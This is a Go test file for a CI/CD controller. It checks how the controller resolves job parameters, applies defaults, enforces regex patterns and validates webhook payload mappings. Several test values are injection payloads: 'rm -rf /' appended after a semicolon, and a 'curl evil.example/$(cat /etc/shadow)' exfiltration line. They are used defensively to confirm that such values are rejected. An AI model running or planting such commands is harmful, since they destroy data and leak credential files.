package controller

import (
	"testing"

	"github.com/eirueimi/unified-cd/internal/dsl"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestResolveParams_MissingRequired_Errors(t *testing.T) {
	inputs := []dsl.Input{
		{Name: "image", Type: "string", Required: true},
	}
	_, err := resolveParams(inputs, map[string]string{})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "image")
}

func TestResolveParams_MissingRequired_MultipleNamesAllListed(t *testing.T) {
	inputs := []dsl.Input{
		{Name: "image", Type: "string", Required: true},
		{Name: "tag", Type: "string", Required: true},
	}
	_, err := resolveParams(inputs, map[string]string{})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "image")
	assert.Contains(t, err.Error(), "tag")
}

func TestResolveParams_OmittedWithDefault_Filled(t *testing.T) {
	inputs := []dsl.Input{
		{Name: "tag", Type: "string", Default: "latest"},
	}
	got, err := resolveParams(inputs, map[string]string{})
	require.NoError(t, err)
	assert.Equal(t, "latest", got["tag"])
}

func TestResolveParams_ExplicitEmptyValue_FallsBackToDefault(t *testing.T) {
	// An explicit `working_dir: ""` must not bypass the declared default; it should
	// fall back to the default just like an omitted param.
	inputs := []dsl.Input{
		{Name: "working_dir", Type: "string", Default: "/src"},
	}
	got, err := resolveParams(inputs, map[string]string{"working_dir": ""})
	require.NoError(t, err)
	assert.Equal(t, "/src", got["working_dir"])
}

func TestResolveParams_ExplicitEmptyValue_NoDefault_KeptEmpty(t *testing.T) {
	// With no declared default there is nothing to fall back to, so an explicit
	// empty value is preserved as-is (and does not error for a non-required param).
	inputs := []dsl.Input{
		{Name: "note", Type: "string"},
	}
	got, err := resolveParams(inputs, map[string]string{"note": ""})
	require.NoError(t, err)
	assert.Equal(t, "", got["note"])
}

func TestResolveParams_ExplicitEmptyValue_RequiredNoDefault_Errors(t *testing.T) {
	// An explicit empty value for a required param with no default is treated as
	// unset, so it errors like an omitted required param.
	inputs := []dsl.Input{
		{Name: "image", Type: "string", Required: true},
	}
	_, err := resolveParams(inputs, map[string]string{"image": ""})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "image")
}

func TestResolveParams_ProvidedValue_Unchanged(t *testing.T) {
	inputs := []dsl.Input{
		{Name: "tag", Type: "string", Default: "latest"},
	}
	got, err := resolveParams(inputs, map[string]string{"tag": "v2"})
	require.NoError(t, err)
	assert.Equal(t, "v2", got["tag"])
}

func TestResolveParams_RequiredWithDefault_NoErrorWhenOmitted(t *testing.T) {
	// A default satisfies the required constraint even when the caller omits it.
	inputs := []dsl.Input{
		{Name: "env", Type: "string", Required: true, Default: "staging"},
	}
	got, err := resolveParams(inputs, map[string]string{})
	require.NoError(t, err)
	assert.Equal(t, "staging", got["env"])
}

func TestResolveParams_NonBoolDefault_FormattedAsString(t *testing.T) {
	inputs := []dsl.Input{
		{Name: "run_tests", Type: "bool", Default: true},
	}
	got, err := resolveParams(inputs, map[string]string{})
	require.NoError(t, err)
	assert.Equal(t, "true", got["run_tests"])
}

func TestResolveParams_UndeclaredParams_PassThrough(t *testing.T) {
	got, err := resolveParams(nil, map[string]string{"extra": "value"})
	require.NoError(t, err)
	assert.Equal(t, "value", got["extra"])
}

func TestResolveParams_NoInputs_ReturnsSuppliedUnchanged(t *testing.T) {
	got, err := resolveParams(nil, map[string]string{"k": "v"})
	require.NoError(t, err)
	assert.Equal(t, map[string]string{"k": "v"}, got)
}

func TestResolveParams_DoesNotMutateSuppliedMap(t *testing.T) {
	inputs := []dsl.Input{
		{Name: "tag", Type: "string", Default: "latest"},
	}
	supplied := map[string]string{}
	_, err := resolveParams(inputs, supplied)
	require.NoError(t, err)
	assert.Empty(t, supplied, "resolveParams must not mutate the caller's map")
}

func TestResolveParams_EnforcesPattern(t *testing.T) {
	inputs := []dsl.Input{{Name: "ref", Type: "string", Pattern: `^[A-Za-z0-9._/-]+$`}}

	_, err := resolveParams(inputs, map[string]string{"ref": "main; rm -rf /"})
	require.Error(t, err, "a value with shell metacharacters must be rejected")
	assert.Contains(t, err.Error(), "ref")

	got, err := resolveParams(inputs, map[string]string{"ref": "refs/heads/main"})
	require.NoError(t, err)
	assert.Equal(t, "refs/heads/main", got["ref"])
}

func TestResolveParams_InvalidPatternIsAnError(t *testing.T) {
	inputs := []dsl.Input{{Name: "ref", Type: "string", Pattern: "([unclosed"}}
	_, err := resolveParams(inputs, map[string]string{"ref": "x"})
	require.Error(t, err, "a malformed pattern must fail loudly, not silently allow everything")
}

func TestResolveParams_NoPatternStillWorks(t *testing.T) {
	inputs := []dsl.Input{{Name: "msg", Type: "string"}}
	got, err := resolveParams(inputs, map[string]string{"msg": "anything goes"})
	require.NoError(t, err)
	assert.Equal(t, "anything goes", got["msg"])
}

func TestResolveParams_PatternAppliesToDefault(t *testing.T) {
	// A bad default must not slip through unvalidated.
	inputs := []dsl.Input{{Name: "env", Type: "string", Default: "staging;rm -rf /", Pattern: `^[A-Za-z0-9._/-]+$`}}
	_, err := resolveParams(inputs, map[string]string{})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "env")
}

func TestResolveParams_ErrorDoesNotEchoRejectedValue(t *testing.T) {
	// The rejected value may itself carry an injection payload; it must not be
	// echoed into an operator-read error message.
	inputs := []dsl.Input{{Name: "ref", Type: "string", Pattern: `^[A-Za-z0-9._/-]+$`}}
	secretPayload := "main; curl evil.example/$(cat /etc/shadow)"
	_, err := resolveParams(inputs, map[string]string{"ref": secretPayload})
	require.Error(t, err)
	assert.NotContains(t, err.Error(), secretPayload)
}

func TestValidateWebhookPayloadMappedParams_RejectsUndeclaredInput(t *testing.T) {
	mapping := map[string]string{"ref": `{{ index .Payload "ref" }}`}
	err := validateWebhookPayloadMappedParams("wh", mapping, nil, "build")
	require.Error(t, err)
	assert.Contains(t, err.Error(), `"wh"`)
	assert.Contains(t, err.Error(), `"ref"`)
	assert.Contains(t, err.Error(), `"build"`)
}

func TestValidateWebhookPayloadMappedParams_RejectsInputWithoutPatternOrUnvalidated(t *testing.T) {
	mapping := map[string]string{"ref": `{{ .Payload.ref }}`}
	inputs := []dsl.Input{{Name: "ref", Type: "string"}}
	err := validateWebhookPayloadMappedParams("wh", mapping, inputs, "build")
	require.Error(t, err)
}

func TestValidateWebhookPayloadMappedParams_AllowsDeclaredPattern(t *testing.T) {
	mapping := map[string]string{"ref": `{{ .Payload.ref }}`}
	inputs := []dsl.Input{{Name: "ref", Type: "string", Pattern: `^[A-Za-z0-9._/-]+$`}}
	require.NoError(t, validateWebhookPayloadMappedParams("wh", mapping, inputs, "build"))
}

func TestValidateWebhookPayloadMappedParams_AllowsExplicitUnvalidated(t *testing.T) {
	mapping := map[string]string{"message": `{{ .Payload.message }}`}
	inputs := []dsl.Input{{Name: "message", Type: "string", Unvalidated: true}}
	require.NoError(t, validateWebhookPayloadMappedParams("wh", mapping, inputs, "build"))
}

func TestValidateWebhookPayloadMappedParams_RejectsHeadersWithoutPatternOrUnvalidated(t *testing.T) {
	// .Headers is not yet implemented, but the guard must fail-safe in advance:
	// if it is ever added, mappings using it require pattern: or unvalidated: true
	// to be explicit about accepting attacker-controlled data.
	mapping := map[string]string{"custom_header": `{{ .Headers.X-Custom-Ref }}`}
	inputs := []dsl.Input{{Name: "custom_header", Type: "string"}}
	err := validateWebhookPayloadMappedParams("wh", mapping, inputs, "build")
	require.Error(t, err)
	assert.Contains(t, err.Error(), `"wh"`)
	assert.Contains(t, err.Error(), `"custom_header"`)
	assert.Contains(t, err.Error(), `"build"`)
}

func TestValidateWebhookPayloadMappedParams_IgnoresLiteralMapping(t *testing.T) {
	// A mapping that never reads .Payload is author-controlled (set directly
	// in the receiver's YAML), not attacker-controlled, so it is not subject
	// to this check even if the job declares no pattern for it.
	mapping := map[string]string{"image": "myapp"}
	require.NoError(t, validateWebhookPayloadMappedParams("wh", mapping, nil, "build"))
}
